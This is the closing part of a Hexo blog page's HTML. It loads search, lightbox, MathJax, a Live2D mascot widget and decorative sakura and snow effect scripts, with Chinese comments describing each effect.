<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<!-- hexo injector body_end start --><script src="/assets/mmedia/mmedia-loader.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/ni-j.model.json"},"display":{"position":"left","width":260,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
   </html>

<!-- 雪花特效 -->
<!-- 直接引用公网CDN在线文件 -->
<!-- <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/xuehuapiaoluo.js">-->
<!-- 引用本地文件 -->
<!--<script type="text/javascript" src="\js\snow.js"></script>-->

<!-- 樱花花特效 -->
<!-- 直接引用公网CDN在线文件 -->
<!--<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/sakura.js"></script>-->
<!-- 引用本地文件 -->
<script type="text/javascript" src="\js\sakura.js"></script>


<!-- 数字雨 
<canvas id="canvas" width="1440" height="900" ></canvas>
<script type="text/javascript" src="/js/DigitalRain.js"></script>-->

<!--单击显示文字-->
<script type="text/javascript" src="/js/click_show_text.js"></script>

<!--图片预加载-->
<script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>